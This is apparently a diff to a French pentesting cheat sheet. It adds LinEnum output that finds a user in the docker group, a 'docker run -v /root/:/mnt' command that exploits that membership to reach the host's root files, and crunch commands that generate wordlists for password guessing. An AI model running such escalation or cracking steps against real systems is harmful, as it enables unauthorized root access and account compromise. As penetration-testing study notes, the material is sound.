@@ -413,7 +413,23 @@ Des pense-bêtes pour des milliers de commandes. Pour apprendre rapidement et si
 
 # Docker
 
+```bash
+./LinEnum.sh
+[+] Looks like we're hosting Docker:
+Docker version 18.09.1, build 4c52b90
+CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                     PORTS               NAMES
+21474b9931f0        alpine              "/bin/sh"           12 months ago       Exited (0) 12 months ago                       suspicious_lamport
 
+
+[+] We're a member of the (docker) group - could possibly misuse these rights!
+uid=1002(jerry) gid=1002(jerry) groups=1002(jerry),114(docker)
+
+```
+
+
+```bash
+docker run -v /root/:/mnt -it alpine
+```
 ## Numeration docker
 
 - deepce github
@@ -447,10 +463,15 @@ Configuration file : `/etc/cupp.cfg`
 	% will insert numbers
 	^ will insert symbols
 
+crunch 3 3 abc + 123 !@# -t ^%@
+will generate 3 character words starting with !1a and ending with #3c
+
 
 ```bash
+/bin/sh
 crunch 3 3 abc + 123 !@# -t @%^
 crunch 3 3 abc 123 !@# -t @%^
+crunch 4 4 hadi + 0123456789 !,
 
 ```
 
